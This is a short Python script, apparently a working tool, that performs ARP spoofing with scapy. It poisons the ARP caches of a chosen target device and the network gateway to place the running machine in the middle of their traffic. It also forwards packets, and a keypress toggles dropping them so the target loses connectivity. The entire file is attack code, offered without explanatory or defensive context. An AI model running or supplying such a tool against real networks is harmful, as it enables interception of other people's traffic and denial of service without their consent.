#!/usr/bin/env python3

import scapy.all as net

import hardware, routing
import threading, atexit, time

ARP_RESTORE_TIME = 2 #seconds

arp_ready = False

def arpThread(interface, gateway, target):
	global arp_ready
	arp_ready = False
	def restore():
		print(f"Restoring ARP cache for {ARP_RESTORE_TIME}s")
		for i in range(ARP_RESTORE_TIME):
			net.sendp( net.Ether(dst=target.mac)  / net.ARP( op="is-at", hwdst=target.mac,  pdst=str(target.ip),  hwsrc=gateway.mac, psrc=str(gateway.ip) ),verbose=0)
			net.sendp( net.Ether(dst=gateway.mac) / net.ARP( op="is-at", hwdst=gateway.mac, pdst=str(gateway.ip), hwsrc=target.mac, psrc=str(target.ip)  ),verbose=0)
			time.sleep(1)

	atexit.register(restore)
	arp_ready = True
	while True: #spoof
		net.sendp( net.Ether(dst=target.mac)  / net.ARP( op="is-at", hwdst=target.mac,  pdst=str(target.ip),  hwsrc=interface.mac, psrc=str(gateway.ip) ),verbose=0)
		net.sendp( net.Ether(dst=gateway.mac) / net.ARP( op="is-at", hwdst=gateway.mac, pdst=str(gateway.ip), hwsrc=interface.mac, psrc=str(target.ip)  ),verbose=0)
		time.sleep(1)


if __name__ == "__main__":
	interface = hardware.findInterfaces()[0]
	print(interface.name)

	network_devices = hardware.findNetworkDevices(interface)
	gateway = hardware.findNetworkDevice(network_devices, target_ip=interface.gateway)
	target = hardware.findNetworkDevice(network_devices)

	print("Initialising IP forward")
	threading.Thread(target=routing.start, args=(target,), daemon=True).start()

	while not routing.ready:
		time.sleep(0.1)

	print("Starting arp spoof")
	threading.Thread(target=arpThread, args=(interface, gateway, target), daemon=True).start()

	try:
		while True:
			input("Input >")
			routing.drop_packets = not routing.drop_packets
			print("Dropping", routing.drop_packets)
	except:
		print("Exiting...")
		raise SystemExit

